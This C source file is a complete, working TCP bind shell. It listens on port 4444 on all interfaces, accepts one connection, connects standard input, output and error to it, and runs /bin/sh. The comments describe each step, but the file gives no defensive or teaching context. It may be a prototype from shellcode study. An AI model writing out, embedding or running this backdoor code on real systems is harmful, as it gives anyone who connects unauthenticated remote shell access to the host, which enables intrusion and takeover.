#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main ()
{
    /* Create a TCP Socket */
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    /* Create an IP Socket Address Structure */
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = INADDR_ANY;

    /* Bind TCP Socket to IP Socket Address Structure */
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    /* Designate Socket to Listen for Connection Requests */
    listen(sockfd, 0);

    /* Accept Connection Requests on the Socket */
    int connfd = accept(sockfd, NULL, NULL);

    /* Direct Connection Socket Output */
    for (int i = 0; i < 3; i++)
    {
        dup2(connfd, i);
    }

    /* Execute Program */
    execve("/bin/sh", NULL, NULL);
    return 0;
}
